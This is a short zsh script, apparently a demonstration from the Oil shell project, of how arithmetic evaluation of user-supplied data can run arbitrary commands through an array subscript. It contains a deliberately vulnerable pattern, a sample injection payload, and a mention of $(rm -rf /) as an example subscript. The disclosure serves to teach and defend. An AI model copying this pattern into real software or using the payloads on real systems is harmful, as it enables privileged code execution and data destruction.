#!/bin/zsh
# Author: Andy Chu (andy@oilshell.org)

cat <<'EOF'

Suppose this script runs as root on a user-supplied data file, and suppose the
user knows that it's run like this:

$ ./ss2-minimal-zsh.sh userfile

Then they can supply 'userfile' with these contents:

myarray[$(echo 42 | tee PWNED)]

And cause arbitrary shell code to be executed with elevated privileges.  The
issue is:

- echo $(( len + 1 )) evaluates 'len' in an arithmetic context,
- Shells try to evaluate array expressions like myarray[0] in arithmetic
  contexts (*), and
- Array subscripts can be formed from command substitutions like $(rm -rf /).

(*) In ZSH, unlike in bash or mksh, the array must be declared.

Note that if the file is this:

$(echo 42 | tee PWNED)

Then the exploit does NOT work.

A realistic situation where this may be encountered is when doing arithmetic on
the CONTENT_LENGTH header of a CGI request.

https://stackoverflow.com/questions/52242133/how-to-get-file-from-post-data-in-bash-cgi-script

This example would be exploitable if it used [[ rather than [.  [ doesn't use
an arithmetic context, but [[ does.  See more arithmetic contexts in
ss2-demos.sh.

EOF

echo ---
echo

# IMPORTANT ZSH-SPECIFIC DIFFERENCE from ssd-minimal!!!  Must declare it!!!
# An attacker could search the targeted code for declared arrays.
typeset -a myarray

rm -f PWNED  # remove results of previous exploits

# Read a line from a user-supplied file
file=${1:-userfile}
read len < $file

# Do some arithmetic on it.  SURPRISINGLY, This code allows an exploit!
echo $(( len + 1 ))  # POSIX shell

# [[ len -eq 0 ]] and many other expression also work in mksh and bash.  See
# ss2-demos.sh or mksh-ss2-demos.sh.

cat <<EOF
If you ran me with bash, then depending on the contents of $file, I
may have executed code inside the 'len' variable.  Check your file
system.
EOF

echo
echo "len = '$len'"

echo
echo 'Contents of PWNED:'
cat PWNED

